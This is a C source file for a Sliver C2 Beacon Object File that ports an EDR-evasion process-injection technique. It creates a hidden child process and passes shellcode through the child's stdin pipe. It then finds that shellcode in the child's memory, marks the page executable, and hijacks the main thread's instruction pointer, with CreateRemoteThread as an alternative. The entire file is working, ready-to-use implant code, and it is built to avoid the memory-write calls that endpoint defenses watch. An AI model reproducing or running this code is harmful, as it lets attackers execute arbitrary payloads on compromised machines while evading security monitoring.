/*
 * injectconsole.c - Sliver BOF port of InjectSetConsole
 *
 * Original technique: Two Seven One Three
 *   https://www.zerosalarium.com/2026/09/edr-evasion-process-injection-without-WriteProcessMemory.html
 *
 * The point of the original technique is preserved exactly:
 *   - NO VirtualAllocEx
 *   - NO WriteProcessMemory
 *
 * Payload travels through the child's redirected STDIN pipe. The child's own
 * CRT reads the bytes into a MEM_PRIVATE committed buffer, then we locate the
 * marker in that buffer, flip the page to RWX and hijack the main thread RIP.
 *
 * BOF-specific differences vs. the standalone EXE:
 *   - entrypoint is go(char *args, int alen)
 *   - zero C++/STL, zero libc (output goes through BeaconOutput)
 *   - arguments come from the Sliver manifest (path + shellcode file)
 *   - every potentially blocking stage is bounded (see tunables)
 *   - a failed stdin write terminates the child instead of closing a handle
 *     with a pending synchronous write (CloseHandle can block on that)
 *   - child only inherits the two pipe handles (PROC_THREAD_ATTRIBUTE_HANDLE_LIST)
 *   - all handles are closed before returning (no leak in a long-lived implant)
 *
 * Build with -DIC_LOG for a debug object that appends stage/timing lines to
 * C:\Users\Public\injectconsole.log (fallback %TEMP%\injectconsole.log). That
 * is the only way to see progress if the BOF never returns, because Sliver
 * buffers BOF output until the entrypoint returns.
 *
 * amd64 only: the hijack writes CONTEXT.Rip.
 */

#include <windows.h>
#include <tlhelp32.h>

#if !defined(_M_X64) && !defined(__x86_64__)
#error "injectconsole BOF is amd64-only (RIP hijack)."
#endif

/* ------------------------------------------------------------------ */
/* minimal Beacon API (declarations only, no beacon.h dependency)      */
/* ------------------------------------------------------------------ */

typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} datap;

__declspec(dllimport) void  BeaconDataParse(datap *parser, char *buffer, int size);
__declspec(dllimport) char *BeaconDataExtract(datap *parser, int *size);
__declspec(dllimport) void  BeaconOutput(int type, char *data, int length);

#define CALLBACK_OUTPUT 0

typedef BOOL (WINAPI *PFN_CancelSynchronousIo)(HANDLE);

/* ------------------------------------------------------------------ */
/* tunables - everything that can block has a budget                   */
/* ------------------------------------------------------------------ */

#define MARKER_LEN          25          /* keep in sync with find_pattern()  */
#define SCAN_CHUNK          (1024 * 1024) /* fewer ReadProcessMemory calls  */
#define SCAN_MAX_REGION     ((SIZE_T)64 * 1024 * 1024)
#define SCAN_BUDGET_MS      8000        /* total wall clock for all attempts */
#define SCAN_BYTE_BUDGET    ((SIZE_T)192 * 1024 * 1024) /* per attempt      */
#define SCAN_RETRY_MS       250
#define WRITE_TIMEOUT_MS    3000        /* child must drain stdin by then    */
#define PRESTDIN_MS         150
#define POSTHIJACK_MS       250
#define LARGE_PAYLOAD_WARN  8192        /* technique practical limit         */

/* ------------------------------------------------------------------ */
/* optional debug log (-DIC_LOG)                                       */
/* ------------------------------------------------------------------ */

static HANDLE open_log(void) {
#ifdef IC_LOG
    static const char *fixed = "C:\\Users\\Public\\injectconsole.log";
    char tmp[MAX_PATH];
    char tmpfile[MAX_PATH];
    DWORD n;
    int i, j;

    {
        HANDLE h = CreateFileA(fixed, FILE_APPEND_DATA,
                               FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                               OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) return h;
    }

    n = GetTempPathA(MAX_PATH, tmp);
    if (n == 0 || n >= MAX_PATH - 20) return INVALID_HANDLE_VALUE;
    i = 0;
    while (tmp[i] && i < MAX_PATH - 1) { tmpfile[i] = tmp[i]; i++; }
    j = 0;
    while ("injectconsole.log"[j] && i < MAX_PATH - 1) {
        tmpfile[i++] = "injectconsole.log"[j++];
    }
    tmpfile[i] = '\0';

    return CreateFileA(tmpfile, FILE_APPEND_DATA, FILE_SHARE_READ | FILE_SHARE_WRITE,
                       NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
#else
    return INVALID_HANDLE_VALUE;
#endif
}

#ifdef IC_LOG
static void ic_log(HANDLE h, const char *tag, unsigned long long v, int as_hex) {
    char buf[256];
    char tmp[24];
    int i = 0, t = 0;
    DWORD wrote = 0;

    if (h == INVALID_HANDLE_VALUE) return;

    while (*tag && i < 200) buf[i++] = *tag++;
    buf[i++] = ' ';

    if (as_hex) {
        buf[i++] = '0'; buf[i++] = 'x';
        if (v == 0) {
            buf[i++] = '0';
        } else {
            while (v != 0 && t < 20) {
                int d = (int)(v & 0xFULL);
                tmp[t++] = (char)(d < 10 ? ('0' + d) : ('a' + d - 10));
                v >>= 4;
            }
            while (t > 0 && i < 240) buf[i++] = tmp[--t];
        }
    } else {
        if (v == 0) {
            tmp[t++] = '0';
        } else {
            while (v != 0 && t < 20) {
                tmp[t++] = (char)('0' + (int)(v % 10ULL));
                v /= 10ULL;
            }
        }
        while (t > 0 && i < 240) buf[i++] = tmp[--t];
    }

    buf[i++] = '\r';
    buf[i++] = '\n';
    WriteFile(h, buf, (DWORD)i, &wrote, NULL);
}
#define LOG(h, tag, v, hex) ic_log((h), (tag), (unsigned long long)(v), (hex))
#else
#define LOG(h, tag, v, hex) do { (void)(h); } while (0)
#endif

/* ------------------------------------------------------------------ */
/* tiny output helpers (no printf / no libc)                           */
/* ------------------------------------------------------------------ */

static void bof_zero(void *p, unsigned int n) {
    unsigned char *b = (unsigned char *)p;
    unsigned int i;
    for (i = 0; i < n; i++) b[i] = 0;
}

static void bof_copy(unsigned char *dst, const unsigned char *src, int n) {
    int i;
    for (i = 0; i < n; i++) dst[i] = src[i];
}

static int bof_memcmp(const unsigned char *a, const unsigned char *b, int n) {
    int i;
    for (i = 0; i < n; i++) {
        if (a[i] != b[i]) return (int)a[i] - (int)b[i];
    }
    return 0;
}

static int bof_streq(const char *a, const char *b) {
    int i = 0;
    if (!a || !b) return 0;
    while (a[i] && b[i]) {
        if (a[i] != b[i]) return 0;
        i++;
    }
    return a[i] == b[i];
}

static void bof_out(const char *s) {
    int n = 0;
    if (!s) return;
    while (s[n]) n++;
    if (n > 0) BeaconOutput(CALLBACK_OUTPUT, (char *)s, n);
}

static void bof_out_bytes(const char *prefix, const unsigned char *p, int n) {
    static const char hexd[] = "0123456789abcdef";
    char buf[128];
    int i = 0, k;

    if (prefix) {
        while (*prefix && i < 100) buf[i++] = *prefix++;
    }
    for (k = 0; k < n && i < 120; k++) {
        buf[i++] = hexd[(p[k] >> 4) & 0xF];
        buf[i++] = hexd[p[k] & 0xF];
        if (k + 1 < n) buf[i++] = ' ';
    }
    buf[i++] = '\n';
    buf[i] = '\0';
    BeaconOutput(CALLBACK_OUTPUT, buf, i);
}

/* prints: prefix + (0xHEX | DEC) + "\n" */
static void bof_out_num(const char *prefix, int as_hex, unsigned long long v) {
    char buf[256];
    char tmp[24];
    int i = 0, t = 0;

    if (prefix) {
        while (*prefix && i < 200) buf[i++] = *prefix++;
    }

    if (as_hex) {
        buf[i++] = '0';
        buf[i++] = 'x';
        if (v == 0) {
            buf[i++] = '0';
        } else {
            while (v != 0 && t < 20) {
                int d = (int)(v & 0xFULL);
                tmp[t++] = (char)(d < 10 ? ('0' + d) : ('a' + d - 10));
                v >>= 4;
            }
            while (t > 0 && i < 240) buf[i++] = tmp[--t];
        }
    } else {
        if (v == 0) {
            tmp[t++] = '0';
        } else {
            while (v != 0 && t < 20) {
                tmp[t++] = (char)('0' + (int)(v % 10ULL));
                v /= 10ULL;
            }
        }
        while (t > 0 && i < 240) buf[i++] = tmp[--t];
    }

    buf[i++] = '\n';
    buf[i] = '\0';
    BeaconOutput(CALLBACK_OUTPUT, buf, i);
}

/* ------------------------------------------------------------------ */
/* remote pattern scan (READ-ONLY, bounded by bytes and wall clock)    */
/* ------------------------------------------------------------------ */

static uintptr_t find_pattern(HANDLE hProc, const unsigned char *pat, int patLen,
                              SIZE_T *byteBudget, DWORD deadline, int allowLarge) {
    SYSTEM_INFO si;
    MEMORY_BASIC_INFORMATION mbi;
    unsigned char *buf = NULL;
    uintptr_t found = 0;
    uintptr_t addr, maxAddr;

    if (!pat || patLen <= 0 || !byteBudget || *byteBudget == 0) return 0;

    GetNativeSystemInfo(&si);
    addr = (uintptr_t)si.lpMinimumApplicationAddress;
    maxAddr = (uintptr_t)si.lpMaximumApplicationAddress;

    buf = (unsigned char *)VirtualAlloc(NULL, SCAN_CHUNK, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!buf) return 0;

    while (addr < maxAddr) {
        if ((int)(GetTickCount() - deadline) >= 0) break;
        if (*byteBudget == 0) break;

        if (!VirtualQueryEx(hProc, (LPCVOID)addr, &mbi, sizeof(mbi))) {
            addr += (uintptr_t)si.dwPageSize;
            continue;
        }

        {
            DWORD prot = mbi.Protect;
            BOOL readable = (prot & (PAGE_READONLY | PAGE_READWRITE | PAGE_EXECUTE_READ |
                                     PAGE_EXECUTE_READWRITE | PAGE_WRITECOPY |
                                     PAGE_EXECUTE_WRITECOPY)) != 0;
            BOOL usable = (mbi.State == MEM_COMMIT) && (mbi.Type == MEM_PRIVATE) &&
                          readable && !(prot & (PAGE_GUARD | PAGE_NOACCESS));

            if (usable && mbi.RegionSize >= (SIZE_T)patLen &&
                (allowLarge || mbi.RegionSize <= SCAN_MAX_REGION)) {
                uintptr_t base = (uintptr_t)mbi.BaseAddress;
                SIZE_T size = mbi.RegionSize;
                SIZE_T off = 0;

                while (off < size) {
                    SIZE_T want = size - off;
                    SIZE_T got = 0;

                    if (*byteBudget == 0) break;
                    if (want > SCAN_CHUNK) want = SCAN_CHUNK;
                    if (want > *byteBudget) want = *byteBudget;

                    if (!ReadProcessMemory(hProc, (LPCVOID)(base + off), buf, want, &got) || got == 0) {
                        break;
                    }
                    *byteBudget -= got;

                    if (got >= (SIZE_T)patLen) {
                        SIZE_T limit = got - (SIZE_T)patLen;
                        SIZE_T i;
                        for (i = 0; i <= limit; i++) {
                            if (buf[i] == pat[0] && bof_memcmp(buf + i, pat, patLen) == 0) {
                                found = base + off + i;
                                break;
                            }
                        }
                    }

                    if (found) break;
                    if (got < (SIZE_T)SCAN_CHUNK) break;

                    /* overlap so a match spanning two chunks is still found */
                    off += got - (SIZE_T)(patLen - 1);
                }

                if (found) break;
            }
        }

        addr = (uintptr_t)mbi.BaseAddress + mbi.RegionSize;
        if (mbi.RegionSize == 0) addr += (uintptr_t)si.dwPageSize;
    }

    VirtualFree(buf, 0, MEM_RELEASE);
    return found;
}

/* ------------------------------------------------------------------ */
/* main thread discovery (Toolhelp32 + NtQueryInformationThread)       */
/* ------------------------------------------------------------------ */

typedef LONG BOF_NTSTATUS;
typedef BOF_NTSTATUS (NTAPI *PFN_NtQueryInformationThread)(HANDLE, ULONG, PVOID, ULONG, PULONG);
typedef BOF_NTSTATUS (NTAPI *PFN_NtSetContextThread)(HANDLE, PCONTEXT);

#define BOF_ThreadQuerySetWin32StartAddress 9

static DWORD get_main_thread_id(DWORD pid) {
    uintptr_t imageBase = 0, imageEnd = 0;
    DWORD best = 0, firstAny = 0;
    HANDLE snap;
    HMODULE ntdll;
    PFN_NtQueryInformationThread pNtQit = NULL;

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE | TH32CS_SNAPMODULE32, pid);
    if (snap != INVALID_HANDLE_VALUE) {
        MODULEENTRY32W me;
        bof_zero(&me, sizeof(me));
        me.dwSize = sizeof(me);
        if (Module32FirstW(snap, &me)) {
            imageBase = (uintptr_t)me.modBaseAddr;
            imageEnd = imageBase + (uintptr_t)me.modBaseSize;
        }
        CloseHandle(snap);
    }

    ntdll = GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        pNtQit = (PFN_NtQueryInformationThread)(void *)GetProcAddress(ntdll, "NtQueryInformationThread");
    }

    snap = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;

    {
        THREADENTRY32 te;
        bof_zero(&te, sizeof(te));
        te.dwSize = sizeof(te);

        if (Thread32First(snap, &te)) {
            do {
                HANDLE hT;
                void *startAddr = NULL;

                if (te.th32OwnerProcessID != pid) continue;
                if (!firstAny) firstAny = te.th32ThreadID;

                if (!pNtQit || !imageBase || !imageEnd) continue;

                hT = OpenThread(THREAD_QUERY_INFORMATION | THREAD_QUERY_LIMITED_INFORMATION,
                                FALSE, te.th32ThreadID);
                if (!hT) continue;

                startAddr = NULL;
                pNtQit(hT, BOF_ThreadQuerySetWin32StartAddress,
                       &startAddr, sizeof(startAddr), NULL);
                CloseHandle(hT);

                if (startAddr && (uintptr_t)startAddr >= imageBase &&
                    (uintptr_t)startAddr < imageEnd) {
                    best = te.th32ThreadID;
                    break;
                }
            } while (Thread32Next(snap, &te));
        }
    }

    CloseHandle(snap);
    return best ? best : firstAny;
}

/* ------------------------------------------------------------------ */
/* suspend + RIP hijack (NtSetContextThread, SetThreadContext fallback)*/
/* ------------------------------------------------------------------ */

static BOOL hijack_thread_rip(DWORD tid, uintptr_t newRip, BOOL resumeAfter, HANDLE logh) {
    HANDLE hT;
    CONTEXT ctx;
    BOOL ok = FALSE;

    hT = OpenThread(THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_SET_CONTEXT,
                    FALSE, tid);
    if (!hT) {
        LOG(logh, "hijack: OpenThread failed", (unsigned long long)GetLastError(), 0);
        return FALSE;
    }

    LOG(logh, "hijack: suspending", 0, 0);
    if (SuspendThread(hT) == (DWORD)-1) {
        LOG(logh, "hijack: SuspendThread failed", (unsigned long long)GetLastError(), 0);
        CloseHandle(hT);
        return FALSE;
    }
    LOG(logh, "hijack: suspended", 0, 0);

    bof_zero(&ctx, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_CONTROL;

    if (!GetThreadContext(hT, &ctx)) {
        LOG(logh, "hijack: GetThreadContext failed", (unsigned long long)GetLastError(), 0);
        ResumeThread(hT);
        CloseHandle(hT);
        return FALSE;
    }
    LOG(logh, "hijack: got context", (unsigned long long)ctx.Rip, 1);
    bof_out_num("[+] old RIP: ", 1, (unsigned long long)ctx.Rip);

    ctx.Rip = (DWORD64)newRip;

    {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        PFN_NtSetContextThread pNtSet = NULL;

        if (ntdll) {
            pNtSet = (PFN_NtSetContextThread)(void *)GetProcAddress(ntdll, "NtSetContextThread");
        }
        if (pNtSet) {
            ok = (pNtSet(hT, &ctx) == 0) ? TRUE : FALSE;
        }
        if (!ok) {
            ok = SetThreadContext(hT, &ctx) ? TRUE : FALSE;
            LOG(logh, "hijack: SetThreadContext fallback", (unsigned long long)ok, 0);
        } else {
            LOG(logh, "hijack: NtSetContextThread ok", 0, 0);
        }
    }

    if (resumeAfter) {
        if (ResumeThread(hT) == (DWORD)-1) ok = FALSE;
        LOG(logh, "hijack: resumed", (unsigned long long)ok, 0);
    }

    CloseHandle(hT);
    return ok;
}

/* ------------------------------------------------------------------ */
/* bounded stdin writer (a child that never reads must not hang us)    */
/* ------------------------------------------------------------------ */

typedef struct {
    HANDLE h;
    const unsigned char *data;
    DWORD len;
    DWORD err;
} write_ctx;

static DWORD WINAPI stdin_writer(LPVOID param) {
    write_ctx *c = (write_ctx *)param;
    DWORD off = 0;

    while (off < c->len) {
        DWORD w = 0;
        if (!WriteFile(c->h, c->data + off, c->len - off, &w, NULL) || w == 0) {
            c->err = GetLastError();
            return 1;
        }
        off += w;
    }
    return 0;
}

/* ------------------------------------------------------------------ */
/* non-blocking drain of the child's stdout (feedback only)            */
/* ------------------------------------------------------------------ */

static void drain_pipe(HANDLE h) {
    DWORD avail = 0;
    char buf[2048];
    DWORD toRead, read_ = 0;

    if (!h || h == INVALID_HANDLE_VALUE) return;
    if (!PeekNamedPipe(h, NULL, 0, NULL, &avail, NULL) || avail == 0) return;

    toRead = (avail > (DWORD)sizeof(buf)) ? (DWORD)sizeof(buf) : avail;
    if (ReadFile(h, buf, toRead, &read_, NULL) && read_ > 0) {
        BeaconOutput(CALLBACK_OUTPUT, buf, (int)read_);
    }
}

/* ------------------------------------------------------------------ */
/* entrypoint                                                          */
/* ------------------------------------------------------------------ */

void go(char *args, int alen) {
    datap parser;
    char *path = NULL;
    char *method = NULL;
    int use_thread = 0;
    unsigned char *sc = NULL;
    int scLen = 0;

    HANDLE inRd = NULL, inWr = NULL, outRd = NULL, outWr = NULL;
    HANDLE logh = INVALID_HANDLE_VALUE;

    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID attrMem = NULL;
    BOOL haveAttr = FALSE;
    DWORD createFlags;
    DWORD err;

    unsigned char *payload = NULL;
    SIZE_T total = 0;
    uintptr_t found = 0;
    DWORD mainTid;
    BOOL writerAlive = FALSE;

    /* marker that survives the child's stdin read; shellcode starts at +0x19 */
    unsigned char marker[MARKER_LEN] = {
        0x61, 0x61, 0x61, 0x62, 0x62, 0x62, 0x63, 0x63, 0x63, 0x64, 0x64, 0x64,
        0x65, 0x65, 0x65, 0x66, 0x66, 0x66, 0x66, 0x67, 0x67, 0x67, 0x6A, 0x6A,
        0x6A
    };

    bof_zero(&pi, sizeof(pi));
    bof_zero(&si, sizeof(si));

    logh = open_log();
    LOG(logh, "=== start ===", 0, 0);

    BeaconDataParse(&parser, args, alen);

    path = BeaconDataExtract(&parser, NULL);
    if (!path || !path[0]) {
        bof_out("[-] missing <executable_path>\n");
        return;
    }

    sc = (unsigned char *)BeaconDataExtract(&parser, &scLen);
    if (!sc || scLen <= 0) {
        bof_out("[-] missing or empty shellcode blob\n");
        return;
    }

    /* optional: -method hijack (default) | thread */
    method = BeaconDataExtract(&parser, NULL);
    if (method && (bof_streq(method, "thread") || bof_streq(method, "ct"))) {
        use_thread = 1;
    }
    bof_out("[*] method: ");
    bof_out(use_thread ? "CreateRemoteThread" : "hijack");
    bof_out("\n");

    bof_out("[*] target: ");
    bof_out(path);
    bof_out("\n");
    bof_out_num("[*] shellcode bytes: ", 0, (unsigned long long)scLen);
    LOG(logh, "target parsed, scLen", (unsigned long long)scLen, 0);

    total = (SIZE_T)MARKER_LEN + (SIZE_T)scLen;
    if (total > LARGE_PAYLOAD_WARN) {
        bof_out("[!] payload larger than the practical limit for this technique\n");
    }

    /* ---- build marker + shellcode buffer (local, in the implant) ---- */
    payload = (unsigned char *)VirtualAlloc(NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!payload) {
        bof_out("[-] VirtualAlloc(payload) failed\n");
        return;
    }
    bof_copy(payload, marker, MARKER_LEN);
    bof_copy(payload + MARKER_LEN, sc, scLen);

    /* ---- pipes: inheritable, child side only ---- */
    {
        SECURITY_ATTRIBUTES sa;
        sa.nLength = sizeof(sa);
        sa.bInheritHandle = TRUE;
        sa.lpSecurityDescriptor = NULL;

        if (!CreatePipe(&outRd, &outWr, &sa, 0)) {
            bof_out("[-] CreatePipe(STDOUT) failed\n");
            goto cleanup;
        }
        SetHandleInformation(outRd, HANDLE_FLAG_INHERIT, 0);

        if (!CreatePipe(&inRd, &inWr, &sa, 0)) {
            bof_out("[-] CreatePipe(STDIN) failed\n");
            goto cleanup;
        }
        SetHandleInformation(inWr, HANDLE_FLAG_INHERIT, 0);
    }
    LOG(logh, "pipes ok", 0, 0);

    si.StartupInfo.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.StartupInfo.wShowWindow = SW_HIDE;
    si.StartupInfo.hStdError = outWr;
    si.StartupInfo.hStdOutput = outWr;
    si.StartupInfo.hStdInput = inRd;

    /* restrict inheritance to the two pipe handles only */
    {
        HANDLE inherit[2];
        SIZE_T attrSize = 0;

        inherit[0] = inRd;
        inherit[1] = outWr;

        InitializeProcThreadAttributeList(NULL, 1, 0, &attrSize);
        if (attrSize) {
            attrMem = VirtualAlloc(NULL, attrSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
            if (attrMem &&
                InitializeProcThreadAttributeList((LPPROC_THREAD_ATTRIBUTE_LIST)attrMem, 1, 0, &attrSize) &&
                UpdateProcThreadAttribute((LPPROC_THREAD_ATTRIBUTE_LIST)attrMem, 0,
                                          PROC_THREAD_ATTRIBUTE_HANDLE_LIST,
                                          inherit, sizeof(inherit), NULL, NULL)) {
                haveAttr = TRUE;
            }
        }
    }

    createFlags = CREATE_NEW_CONSOLE;
    if (haveAttr) {
        si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)attrMem;
        si.StartupInfo.cb = sizeof(si);
        createFlags |= EXTENDED_STARTUPINFO_PRESENT;
    } else {
        /* fallback: every inheritable handle in the implant gets inherited */
        si.lpAttributeList = NULL;
        si.StartupInfo.cb = sizeof(STARTUPINFOA);
        bof_out("[!] handle-list unavailable, falling back to plain inheritance\n");
    }

    LOG(logh, "before CreateProcess", (unsigned long long)(haveAttr ? 1 : 0), 0);
    if (!CreateProcessA(NULL, path, NULL, NULL, TRUE, createFlags, NULL, NULL,
                        (LPSTARTUPINFOA)&si, &pi)) {
        err = GetLastError();
        LOG(logh, "CreateProcess failed", (unsigned long long)err, 0);
        bof_out_num("[-] CreateProcessA failed, err=", 1, (unsigned long long)err);
        goto cleanup;
    }

    bof_out_num("[+] child PID: ", 0, (unsigned long long)pi.dwProcessId);
    LOG(logh, "created pid", (unsigned long long)pi.dwProcessId, 0);

    /* parent no longer needs the child-side ends */
    CloseHandle(outWr); outWr = NULL;
    CloseHandle(inRd);  inRd = NULL;

    /* ---- deliver marker + shellcode over STDIN (replaces WriteProcessMemory) ---- */
    Sleep(PRESTDIN_MS);
    LOG(logh, "write start, bytes", (unsigned long long)total, 0);
    {
        HANDLE th;
        write_ctx wc;
        DWORD waited;

        bof_zero(&wc, sizeof(wc));
        wc.h = inWr;
        wc.data = payload;
        wc.len = (DWORD)total;

        th = CreateThread(NULL, 0, stdin_writer, &wc, 0, NULL);
        if (!th) {
            bof_out("[-] CreateThread failed\n");
            goto cleanup;
        }

        waited = WaitForSingleObject(th, WRITE_TIMEOUT_MS);
        if (waited == WAIT_OBJECT_0) {
            CloseHandle(th);
            if (wc.err) {
                bof_out_num("[-] WriteFile(child stdin) failed, err=", 1, (unsigned long long)wc.err);
                goto cleanup;
            }
        } else {
            HMODULE k32 = GetModuleHandleA("kernel32.dll");
            PFN_CancelSynchronousIo pCancel = NULL;

            LOG(logh, "write timeout, wait", (unsigned long long)waited, 0);

            if (k32) {
                pCancel = (PFN_CancelSynchronousIo)(void *)GetProcAddress(k32, "CancelSynchronousIo");
            }
            if (pCancel) pCancel(th);

            /* killing the reader closes the read end and unblocks the writer */
            TerminateProcess(pi.hProcess, 0xDEAD);

            if (WaitForSingleObject(th, 2000) != WAIT_OBJECT_0) {
                /* Never CloseHandle(inWr) here: the handle has a pending
                   synchronous write and CloseHandle can wait for it. */
                writerAlive = TRUE;
            }
            CloseHandle(th);
            LOG(logh, "write aborted, child terminated", 0, 0);

            bof_out("[-] stdin write timed out: child is not reading stdin\n");
            goto cleanup;
        }
    }
    LOG(logh, "write done", 0, 0);

    /* ---- locate the marker in the child's private committed memory ---- */
    {
        DWORD scanStart = GetTickCount();
        DWORD deadline = scanStart + SCAN_BUDGET_MS;
        SIZE_T lastBudget = SCAN_BYTE_BUDGET;
        int attempts = 0;

        while (!found) {
            lastBudget = SCAN_BYTE_BUDGET;
            /* first attempt skips huge regions (fast path); later ones include them */
            found = find_pattern(pi.hProcess, marker, MARKER_LEN, &lastBudget, deadline,
                                 attempts >= 1 ? 1 : 0);
            attempts++;
            if (found) break;
            if ((int)(GetTickCount() - deadline) >= 0) break;
            Sleep(SCAN_RETRY_MS);
        }

        if (!found) {
            LOG(logh, "scan miss, attempts", (unsigned long long)attempts, 0);
            bof_out_num("[-] marker not found, attempts=", 0, (unsigned long long)attempts);
            bof_out_num("[-] scan elapsed ms=", 0, (unsigned long long)(GetTickCount() - scanStart));
            bof_out_num("[-] bytes read last attempt=", 0,
                        (unsigned long long)(SCAN_BYTE_BUDGET - lastBudget));
            goto cleanup;
        }
        LOG(logh, "scan hit, attempts", (unsigned long long)attempts, 0);
        LOG(logh, "marker found", (unsigned long long)found, 1);
        bof_out_num("[+] marker at: ", 1, (unsigned long long)found);
        bof_out_num("[+] scan elapsed ms: ", 0, (unsigned long long)(GetTickCount() - scanStart));
    }

    /* ---- RWX on the exact payload range, then RIP hijack ---- */
    {
        DWORD oldProt = 0;
        if (!VirtualProtectEx(pi.hProcess, (LPVOID)found, total,
                              PAGE_EXECUTE_READWRITE, &oldProt)) {
            /* buffer may end at a region boundary; clamp to what is mapped */
            MEMORY_BASIC_INFORMATION rmbi;
            SIZE_T avail = 0;
            SIZE_T use = 0;

            if (!VirtualQueryEx(pi.hProcess, (LPCVOID)found, &rmbi, sizeof(rmbi))) {
                err = GetLastError();
                bof_out_num("[-] VirtualProtectEx failed, err=", 1, (unsigned long long)err);
                goto cleanup;
            }
            avail = ((uintptr_t)rmbi.BaseAddress + rmbi.RegionSize) - found;
            use = (total < avail) ? total : avail;
            if (use == 0 ||
                !VirtualProtectEx(pi.hProcess, (LPVOID)found, use,
                                  PAGE_EXECUTE_READWRITE, &oldProt)) {
                err = GetLastError();
                bof_out_num("[-] VirtualProtectEx failed, err=", 1, (unsigned long long)err);
                goto cleanup;
            }
            bof_out_num("[!] clamped protect size: ", 0, (unsigned long long)use);
        }
        LOG(logh, "protect ok, old", (unsigned long long)oldProt, 1);
        bof_out_num("[+] VirtualProtectEx ok, old=", 1, (unsigned long long)oldProt);
    }

    /* ---- confirm the shellcode bytes landed unchanged in the child ---- */
    {
        unsigned char probe[8];
        SIZE_T got = 0;
        int checkLen = scLen;

        bof_out_bytes("[*] local sc[0..8]: ", payload + MARKER_LEN, 8);
        if (ReadProcessMemory(pi.hProcess, (LPCVOID)(found + MARKER_LEN),
                              probe, sizeof(probe), &got) && got == sizeof(probe)) {
            bof_out_bytes("[*] child sc[0..8]: ", probe, 8);
        } else {
            bof_out("[-] could not read back shellcode bytes\n");
        }

        if (checkLen > 8192) checkLen = 8192;
        {
            unsigned char *rb = (unsigned char *)VirtualAlloc(NULL, (SIZE_T)checkLen,
                                                              MEM_COMMIT | MEM_RESERVE,
                                                              PAGE_READWRITE);
            if (rb) {
                SIZE_T got2 = 0;
                if (ReadProcessMemory(pi.hProcess, (LPCVOID)(found + MARKER_LEN), rb,
                                      (SIZE_T)checkLen, &got2) &&
                    got2 == (SIZE_T)checkLen) {
                    int i, mism = 0, first = -1;
                    for (i = 0; i < checkLen; i++) {
                        if (rb[i] != payload[MARKER_LEN + i]) {
                            mism++;
                            if (first < 0) first = i;
                        }
                    }
                    bof_out_num("[*] verified bytes: ", 0, (unsigned long long)checkLen);
                    bof_out_num("[*] mismatches: ", 0, (unsigned long long)mism);
                    if (first >= 0) {
                        bof_out_num("[*] first mismatch at: ", 0, (unsigned long long)first);
                    }
                } else {
                    bof_out("[-] full read-back failed\n");
                }
                VirtualFree(rb, 0, MEM_RELEASE);
            }
        }
    }

    if (use_thread) {
        HANDLE rt;
        LOG(logh, "method: CreateRemoteThread", (unsigned long long)(found + MARKER_LEN), 1);

        rt = CreateRemoteThread(pi.hProcess, NULL, 0,
                                (LPTHREAD_START_ROUTINE)(found + MARKER_LEN),
                                NULL, 0, NULL);
        if (!rt) {
            err = GetLastError();
            bof_out_num("[-] CreateRemoteThread failed, err=", 1, (unsigned long long)err);
            goto cleanup;
        }
        CloseHandle(rt);
        bof_out_num("[+] remote thread started at: ", 1, (unsigned long long)(found + MARKER_LEN));
    } else {
        LOG(logh, "before thread lookup", 0, 0);
        mainTid = get_main_thread_id(pi.dwProcessId);
        if (!mainTid) {
            bof_out("[-] could not resolve main thread\n");
            goto cleanup;
        }
        bof_out_num("[+] main TID: ", 0, (unsigned long long)mainTid);
        LOG(logh, "tid", (unsigned long long)mainTid, 0);

        if (!hijack_thread_rip(mainTid, found + (uintptr_t)MARKER_LEN, TRUE, logh)) {
            bof_out("[-] RIP hijack failed\n");
            goto cleanup;
        }
        LOG(logh, "hijack ok", (unsigned long long)(found + MARKER_LEN), 1);
        bof_out_num("[+] hijacked, new RIP: ", 1, (unsigned long long)(found + MARKER_LEN));

        /* A thread suspended inside NtReadFile only picks up the new RIP once the
           read completes. One more byte does that; the EOF in cleanup also would. */
        if (inWr) {
            DWORD w = 0;
            WriteFile(inWr, "\n", 1, &w, NULL);
            LOG(logh, "hijack: nudge byte written", (unsigned long long)w, 0);
        }
    }

    Sleep(POSTHIJACK_MS);
    {
        DWORD code = 0;
        if (GetExitCodeProcess(pi.hProcess, &code)) {
            if (code == STILL_ACTIVE) {
                bof_out("[*] child still running (payload did not terminate it)\n");
                LOG(logh, "child still active", 0, 0);
            } else {
                bof_out_num("[*] child exited, code=", 0, (unsigned long long)code);
                LOG(logh, "child exited", (unsigned long long)code, 0);
            }
        }
    }
    drain_pipe(outRd);
    LOG(logh, "=== done ===", 0, 0);

cleanup:
    if (payload && !writerAlive) VirtualFree(payload, 0, MEM_RELEASE);
    if (attrMem) VirtualFree(attrMem, 0, MEM_RELEASE);
    if (inWr && !writerAlive) CloseHandle(inWr);
    if (outRd) CloseHandle(outRd);
    if (inRd)  CloseHandle(inRd);
    if (outWr) CloseHandle(outWr);
    if (pi.hThread)  CloseHandle(pi.hThread);
    if (pi.hProcess) CloseHandle(pi.hProcess);
    if (logh != INVALID_HANDLE_VALUE) CloseHandle(logh);
    (void)logh;
}
